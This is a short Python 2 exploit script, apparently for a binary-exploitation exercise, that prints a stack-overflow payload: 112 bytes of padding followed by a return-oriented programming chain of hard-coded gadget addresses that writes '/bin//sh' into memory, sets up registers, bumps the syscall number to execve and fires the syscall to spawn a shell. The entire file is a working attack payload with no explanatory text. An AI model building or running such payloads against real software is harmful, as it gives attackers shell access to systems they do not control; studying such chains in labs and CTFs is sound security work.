from struct import pack

def main():
	dummy = "\x90"*4
	data = pack("<I",0x080ef060)
	zero = pack("<I",0xbffe93c8)
	systemcall = pack("<I",0x080494f9)

	insert_data_1 = pack("<I",0x08057360) + data + dummy + "/bin" + pack("<I",0x0804eae0) + dummy*2 + pack("<I",0x08055062)
	insert_data_2 = pack("<I",0x08057360) + pack("<I",0x080ef064) + dummy + "//sh" + pack("<I",0x0804eae0) + dummy*2 + pack("<I",0x08055062)
	init = pack("<I",0x08057360) + zero + zero + data + pack("<I",0x08051750)
	inc = pack("<I",0x08050bbc) + dummy
	print "\x90"*112 + insert_data_1 + insert_data_2 + init + inc*11 + systemcall
		

if __name__ == '__main__':
	main()
